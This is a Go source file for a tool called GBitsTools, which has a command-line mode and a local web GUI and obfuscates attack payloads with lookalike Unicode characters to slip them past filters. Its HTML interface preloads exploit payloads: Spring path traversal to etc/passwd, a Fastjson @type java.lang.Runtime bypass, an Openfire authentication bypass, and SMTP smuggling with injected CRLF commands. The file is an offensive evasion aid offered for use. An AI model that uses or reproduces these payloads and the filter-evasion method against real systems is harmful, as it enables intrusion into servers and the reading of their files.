package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
)

func main() {
	if len(os.Args) > 1 {
		runCLI()
	} else {
		runGUI()
	}
}

func runCLI() {
	payload := flag.String("p", "", "基础 Payload (必填)")
	repeat := flag.Int("r", 1, "重复次数 (默认: 1)")
	tail := flag.String("t", "", "尾部明文字符串")
	mode := flag.Int("m", 0, "模式: 0(常用汉字), 1(拉丁/西里尔), 2(随机乱码)")
	exempt := flag.String("e", "", "豁免转换的字符 (如 / 或 {} )")
	unicode := flag.Bool("u", false, "输出为 \\uXXXX 转义格式")

	flag.Parse()

	if *payload == "" {
		fmt.Println("错误: 必须提供基础 Payload (-p)")
		flag.Usage()
		os.Exit(1)
	}

	engine := &GhostBitsEngine{}
	result := engine.Generate(*payload, *repeat, *tail, *mode, *exempt, *unicode)
	fmt.Println(result)
}

func runGUI() {
	engine := &GhostBitsEngine{}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, guiHTML)
	})

	http.HandleFunc("/generate", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		r.ParseForm()

		baseText := r.FormValue("base")
		tail := r.FormValue("tail")
		exempt := r.FormValue("exempt")
		asUnicode := r.FormValue("unicode") == "true"
		mode := 0
		repeats := 1

		fmt.Sscanf(r.FormValue("mode"), "%d", &mode)
		fmt.Sscanf(r.FormValue("repeat"), "%d", &repeats)
		if repeats < 1 {
			repeats = 1
		}

		result := engine.Generate(baseText, repeats, tail, mode, exempt, asUnicode)
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		fmt.Fprint(w, result)
	})

	fmt.Println("GBitsTools Web GUI 已启动: http://localhost:8080")
	http.ListenAndServe(":8080", nil)
}

const guiHTML = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GBitsTools</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1e1e2e; color: #cdd6f4; padding: 20px; max-width: 720px; margin: auto; }
h2 { margin: 16px 0 10px; font-size: 14px; color: #89b4fa; }
.section { background: #313244; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
.preset-row { display: flex; gap: 8px; align-items: center; }
select, input[type=text], input[type=number] { background: #45475a; color: #cdd6f4; border: 1px solid #585b70; border-radius: 6px; padding: 8px 12px; font-size: 14px; width: 100%; }
select { cursor: pointer; }
input:focus, select:focus { outline: none; border-color: #89b4fa; }
.form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.form-grid .full { grid-column: 1 / -1; }
label { font-size: 12px; color: #a6adc8; display: block; margin-bottom: 4px; }
.btn { background: #89b4fa; color: #1e1e2e; border: none; border-radius: 6px; padding: 10px 20px; font-size: 14px; font-weight: 600; cursor: pointer; }
.btn:hover { background: #74c7ec; }
.btn-copy { background: #a6e3a1; margin-left: 8px; }
.btn-copy:hover { background: #94e2d5; }
.output-area { background: #11111b; color: #a6e3a1; border: 1px solid #45475a; border-radius: 6px; padding: 12px; font-family: "Consolas", "Monaco", monospace; font-size: 13px; min-height: 160px; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; width: 100%; }
.btn-row { display: flex; gap: 8px; margin-top: 12px; }
.check-row { display: flex; align-items: center; gap: 8px; margin-top: 8px; }
.check-row input[type=checkbox] { width: 16px; height: 16px; accent-color: #89b4fa; }
.emoji { font-size: 16px; }
</style>
</head>
<body>

<h2><span class="emoji">🔥</span> 漏洞预设 (一键加载)</h2>
<div class="section">
  <div class="preset-row">
    <select id="preset" onchange="loadPreset()">
      <option value="0">0. 手动自定义</option>
      <option value="1" selected>1. Spring 目录穿越</option>
      <option value="2">2. Fastjson @type 绕过 (JSON)</option>
      <option value="3">3. Openfire 权限绕过</option>
      <option value="4">4. SMTP 邮件走私</option>
    </select>
  </div>
</div>

<h2><span class="emoji">⚙️</span> 载荷构造参数</h2>
<div class="section">
  <div class="form-grid">
    <div>
      <label>基础 Payload</label>
      <input type="text" id="base" placeholder="输入基础 Payload">
    </div>
    <div>
      <label>重复次数</label>
      <input type="number" id="repeat" value="1" min="1" max="20">
    </div>
    <div class="full">
      <label>不混淆的尾部</label>
      <input type="text" id="tail" placeholder="尾部明文字符串">
    </div>
    <div class="full">
      <label>豁免字符(不转换)</label>
      <input type="text" id="exempt" placeholder='例如: /{}":'>
    </div>
    <div class="full">
      <label><span class="emoji">🎭</span> 伪装字符集</label>
      <select id="mode">
        <option value="0" selected>0. 常用口水汉字 (GB2312)</option>
        <option value="1">1. 拉丁/希腊/西里尔文</option>
        <option value="2">2. 全字符集乱码</option>
      </select>
      <div class="check-row">
        <input type="checkbox" id="unicode">
        <label for="unicode">输出为 \uXXXX 格式 (适用于 JSON 等)</label>
      </div>
    </div>
  </div>
  <div class="btn-row">
    <button class="btn" onclick="doGenerate()">生成</button>
    <button class="btn btn-copy" onclick="doCopy()">复制</button>
  </div>
  <div class="output-area" id="output"></div>
</div>

<script>
const presets = {
  "0": {base:"", repeat:"1", tail:"", exempt:"", unicode:false},
  "1": {base:".%u002e/", repeat:"7", tail:"etc/passw%64", exempt:"/", unicode:false},
  "2": {base:'{"@type":"java.lang.Runtime"}', repeat:"1", tail:"", exempt:'{}":.', unicode:true},
  "3": {base:"%2>/", repeat:"4", tail:"log.jsp", exempt:"/", unicode:false},
  "4": {base:"[CRLF]DATA[CRLF]Subject: PWNED[CRLF].[CRLF]QUIT", repeat:"1", tail:"", exempt:"", unicode:false}
};

function loadPreset() {
  const v = document.getElementById("preset").value;
  const d = presets[v];
  document.getElementById("base").value = d.base;
  document.getElementById("repeat").value = d.repeat;
  document.getElementById("tail").value = d.tail;
  document.getElementById("exempt").value = d.exempt;
  document.getElementById("unicode").checked = d.unicode;
}
loadPreset();

async function doGenerate() {
  const params = new URLSearchParams();
  params.append("base", document.getElementById("base").value);
  params.append("repeat", document.getElementById("repeat").value);
  params.append("tail", document.getElementById("tail").value);
  params.append("exempt", document.getElementById("exempt").value);
  params.append("mode", document.getElementById("mode").value);
  params.append("unicode", document.getElementById("unicode").checked);
  
  const resp = await fetch("/generate", {method:"POST", body:params});
  const text = await resp.text();
  document.getElementById("output").textContent = text;
}

async function doCopy() {
  const text = document.getElementById("output").textContent;
  if (!text) return;
  await navigator.clipboard.writeText(text);
  alert("已复制到剪贴板");
}
</script>

</body>
</html>`
